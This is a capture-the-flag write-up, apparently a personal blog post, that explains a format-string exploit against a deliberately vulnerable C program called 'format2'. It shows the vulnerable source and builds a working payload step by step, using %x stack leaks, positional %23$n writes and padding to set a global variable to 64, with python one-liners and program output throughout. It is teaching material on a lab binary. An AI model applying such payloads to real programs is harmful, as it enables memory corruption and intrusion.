---
title:  "format2 Writeup"
date:   2019-04-01 15:26:00
categories: writeup 
layout: post
author: Ioannis Kyriazis
---


Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];
  char flagBuffer[64];
  FILE *fp;

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);

  fp = fopen("./flag.txt", "r");

  if(target == 64) {
      printf("you have modified the target :)\n");

      fgets(flagBuffer, 64, (FILE*)fp);
      printf("flag: %s\n", flagBuffer);
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

### Objective: Modify the target variable to equal 64 ###

format2.c uses fgets to receive 512 bytes from stdin. This prevents buffer overflows because fgets stops once it receives 512 bytes. What else can we try? If we look at `printf(buffer)` we can see that it prints whatever you supply to stdin without checking your string. What do you think would happen if you entered `%x %x %x`?

.

.

.

It would print out the hex values of whatever is on the stack. Since `%x` expects a parameter and parameters are stored on the stack it will just print the next value on the stack. So what? How will that help us change the value of `target`? Well, the `%n` format specifier is used to write the amount of printed characters into printf's corresponding parameter. For example, 

`printf("hi my name is %s%n", name, &len)` 

would put the value `14 + strlen(name)` into the variable `len`

With this information we can put the address of `target` on the stack and then write to it using the `%n` format specifier. How do we put the address of target onto the stack? First, we need to get its address. We can find it by running `objdump -t format2` in the format2r directory. Then we look for `target`. I found this line

`0804a048 g     O .bss   00000004              target` 

Aha! The address of target is `0x0804a048`! What can we do with it? We can put it on the stack and write to it with the `%n` format specifier! An easy way to put the address of `target` on the stack is to just put it in your exploit string. Before we do that though, we can make it easier on ourselves by using `aaaa` as the address we want to write to. This is better because it is easier to recognize `0x61616161` than `0x0804a048` in a sea of hex numbers. So now our python script that prints our exploit string should look like `python -c "print('aaaa' + '%x '*100)"`. This will put `0x61616161` on the stack and will print out the contents of the stack. Let's find our a's. 

`aaaa200 f7f3d580 f7f74000 f7f41f74 0 4c f7d68e88 0 0 0 0 0 0 0 f7f8a1b7 f7f43000 2cfba f7f867c9 f7f9cfb4 bee2a90c f7f8a186 0 61616161 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 804000a ff9422a4 
target is 0 :(`

As we can see, aaaa is printed at the beginning. This is because it is part of our string. Our string of a's is also printed again in hex. It is the 23rd element on the stack. We can select it specifically with the `$` addition to the format specifier. So `printf("aaaa%23$x")` should print out `aaaa0x61616161`. Your python script should now look like `python -c "print('aaaa' + '%23\$x')`. We need to include the `\` because it escapes the `$` character. Now if you run format2 with your exploit string you should get 

`aaaa61616161
target is 0 :(`

Now that we have isolated the address, let's replace it with the actual address of `target` instead of `0x61616161`. Our python script should look like `python -c "print('\x48\xa0\x04\x08' + '%23\$x')"`. If we run the program with that output we should get

`aaaa0804a048
target is 0 :(`

Let's write-what-where! Instead of `%x`, we'll use `%n` to actually write to `target`'s value. Simply replacing the x with an n, the output of the program changes to 

`H
target is 4 :(`
(If you are getting a segfault here, make sure that you are using python2)

We modified `target`!  However, we're not done yet.  How do we change the value to 64? Simply add 60 bytes of padding. 
`python -c "print('\x48\xa0\x04\x08' + '%60x' + '%23\$n')"`
Viola! You have modified the target :)